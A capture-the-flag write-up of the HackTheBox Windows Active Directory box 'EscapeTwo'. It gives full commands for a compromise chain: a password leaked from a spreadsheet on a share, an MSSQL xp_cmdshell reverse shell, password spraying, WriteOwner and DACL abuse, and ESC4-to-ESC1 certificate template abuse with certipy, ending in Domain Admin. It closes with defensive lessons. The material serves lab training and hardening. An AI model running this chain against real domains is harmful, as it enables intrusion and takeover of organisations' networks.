---
title: "EscapeTwo"
date: 2025-01-11
type: docs
tags:
  - htb
  - windows
  - easy
  - active-directory
  - assumed-breach
  - mssql
  - xp-cmdshell
  - config-file
  - password-reuse
  - bloodhound
  - writeowner
  - adcs
  - esc4
  - esc1
  - certipy
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Windows Server 2019 (AD, `sequel.htb`, `DC01`), **Difficulty:** Easy, **Released:** 2025-01-11, **IP:** `10.10.11.51`

</div>

<div class="callout callout-note">

**Assumed breach**

This box starts with a foothold credential handed to you rather than a pure external recon exercise: `rose : KxEPkKe6R8su`. The interesting work is everything after that.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Given `rose : KxEPkKe6R8su`. An SMB share (`Accounting Department`) holds `accounting.xlsx` and `accounts.xlsx`. `.xlsx` is a zip, unzip it and read `sharedStrings.xml`, which contains the **MSSQL `sa`** password.
2. `mssqlclient.py sequel.htb/sa:...@10.10.11.51` , enable **`xp_cmdshell`** , shell as **`sql_svc`**.
3. `C:\SQL2019\...\sql-Configuration.INI` has the `sql_svc` install password. It is reused by the domain user **`ryan`**.
4. BloodHound: `ryan` has **`WriteOwner`** on **`ca_svc`**. Take ownership, grant yourself full control, then set a Shadow Credential or reset the password to control `ca_svc`.
5. `ca_svc` can edit the vulnerable AD CS template (**ESC4**). Rewrite it to be **ESC1** (enrollee supplies subject, client auth EKU), request a certificate as `administrator`, authenticate. Domain Admin.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| given | `rose : KxEPkKe6R8su` |
| `.xlsx` sharedStrings | `sa : MSSQLP@ssw0rd!` |
| `sql-Configuration.INI`, reused for `ryan` | `WqSZAF6CysDQbGb3` |
| `user.txt` | `C:\Users\ryan\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

</div>

---

## Overview

EscapeTwo is an easy AD box that is really a **certificate services** box with a gentle on-ramp. The early stages are standard: an Office file that is secretly a zip and leaks a password, **MSSQL `xp_cmdshell`**, a config file with a reused password. The teaching content is the end: a **`WriteOwner`** ACL edge to a service account, and then **ESC4** (you can edit a certificate template) which you convert into **ESC1** (you can request a cert for anyone) with `certipy`. It is a compact tour of the modern AD attack toolkit (`bloodhound-python`, `owneredit.py`, `dacledit.py`, `certipy`).

Related MSSQL boxes: [Ascension](/writeups/hackthebox/endgames/ascension/), [Crocc Crew](/writeups/tryhackme/windows/insane/crocc-crew/). Related AD CS: [Anubis](/writeups/hackthebox/windows/insane/anubis/). Related BloodHound ACL abuse (`WriteOwner` / `ForceChangePassword` / `GenericAll`): [Reset](/writeups/tryhackme/windows/hard/reset/), [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Enterprise](/writeups/tryhackme/windows/hard/enterprise/).

---

## Full Walkthrough

### Recon

```console
PORT      STATE SERVICE       VERSION
53,88,135,139,389,445,464,593,636  (standard DC)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268,3269 open  ldap (global catalog)
5985/tcp  open  http          WinRM
9389/tcp  open  mc-nmf        .NET Message Framing (AD Web Services)
```

`DC01` for `sequel.htb`, with **MSSQL 2019** and **WinRM** exposed. With a starting credential already in hand, my first move on any assumed-breach box is always the same: point `netexec` at SMB with the given creds and see what shares open up.

### SMB, the spreadsheet password

```bash
netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
smbclient.py sequel.htb/rose:'KxEPkKe6R8su'@10.10.11.51
# get "Accounting Department/accounting.xlsx" and "accounts.xlsx"
```

<div class="callout callout-note">

**`.xlsx` is a zip**

Modern Office files are ZIP archives of XML. `unzip accounts.xlsx` and read `xl/sharedStrings.xml`, where the cell text lives. On EscapeTwo the cells hold the `sa` MSSQL password (`MSSQLP@ssw0rd!`) and the `sql_svc` password. (`accounting.xlsx` is slightly corrupted, fix the `[Content_Types].xml` header or just carve the strings.)

</div>

### MSSQL to sql_svc

```bash
mssqlclient.py sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami          # sequel\sql_svc
SQL> xp_cmdshell "powershell -e <b64 reverse shell>"
```

### sql_svc to ryan

```powershell
type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
# SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

Rather than assume, I sprayed that password across the domain users I already knew about, and it landed: it is reused for the domain user `ryan`.

```bash
netexec smb 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'      # user.txt
```

### ryan to ca_svc, WriteOwner

```bash
bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -c all -ns 10.10.11.51
```

With `ryan` on the domain, running BloodHound is a reflex at this point, and it did not disappoint: it shows `ryan --WriteOwner--> ca_svc`, which is an interesting edge to land on a service account with `svc` in the name, that naming convention is almost always worth chasing.

<div class="callout callout-note">

**Exploiting WriteOwner**

`WriteOwner` lets you set yourself as the object's owner, and the owner can always edit the DACL. Chain:
```bash
owneredit.py -action write -new-owner ryan -target ca_svc "sequel.htb/ryan:WqSZAF6CysDQbGb3"
dacledit.py -action write -rights FullControl -principal ryan -target ca_svc "sequel.htb/ryan:WqSZAF6CysDQbGb3"
```
Then take over `ca_svc` with a Shadow Credential (no password reset, quieter):
```bash
certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc
# -> ca_svc NT hash
```

</div>

### ca_svc to Domain Admin, ESC4 to ESC1

```bash
certipy find -u ca_svc@sequel.htb -hashes :<ca_svc hash> -dc-ip 10.10.11.51 -vulnerable -stdout
```

<div class="callout callout-note">

**ESC4 then ESC1**

`ca_svc` has write access over a certificate template (**ESC4**). That means you can reconfigure the template. Set it so that the **enrollee supplies the subject** and it has the **Client Authentication** EKU (that is the definition of **ESC1**):
```bash
certipy template -u ca_svc@sequel.htb -hashes :<hash> -template <TemplateName> -save-old
certipy req -u ca_svc@sequel.htb -hashes :<hash> -ca sequel-DC01-CA -template <TemplateName> \
  -upn administrator@sequel.htb -dc-ip 10.10.11.51
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
# -> administrator NT hash
```

</div>

```bash
evil-winrm -i 10.10.11.51 -u administrator -H <admin hash>
type C:\Users\Administrator\Desktop\root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `C:\Users\ryan\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons and Takeaways

- **Office files are archives.** Never store secrets in a spreadsheet on a share; `unzip` reads every string.
- **Disable `xp_cmdshell`** and run SQL Server as a low-priv virtual account, not a domain account whose password is in an INI file.
- **Unique service passwords**, and do not reuse the SQL install password for a user.
- **Audit `WriteOwner` / `WriteDACL` / `GenericAll`** edges in BloodHound. They are silent full compromise.
- **Lock down AD CS templates.** ESC4 (writable template) plus a CA is Domain Admin. Restrict enrollment and template write to tier-0.

---

## Related Writeups

- **MSSQL `xp_cmdshell`:** [Ascension](/writeups/hackthebox/endgames/ascension/), [Crocc Crew](/writeups/tryhackme/windows/insane/crocc-crew/)
- **BloodHound ACL abuse:** [Reset](/writeups/tryhackme/windows/hard/reset/), [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Enterprise](/writeups/tryhackme/windows/hard/enterprise/)
- **AD CS (ESC1 / ESC4 / preview handler):** [Anubis](/writeups/hackthebox/windows/insane/anubis/)
- **Config file with a reused password:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Previse](/writeups/hackthebox/linux/easy/previse/)

## References

- Certipy wiki (ESC1, ESC4) <https://github.com/ly4k/Certipy/wiki>
- Certified Pre-Owned (SpecterOps) <https://posts.specterops.io/certified-pre-owned-d95910965cd2>
- owneredit.py / dacledit.py (impacket) <https://github.com/fortra/impacket>
- Final privilege escalation steps cross-referenced against public writeups for this box.
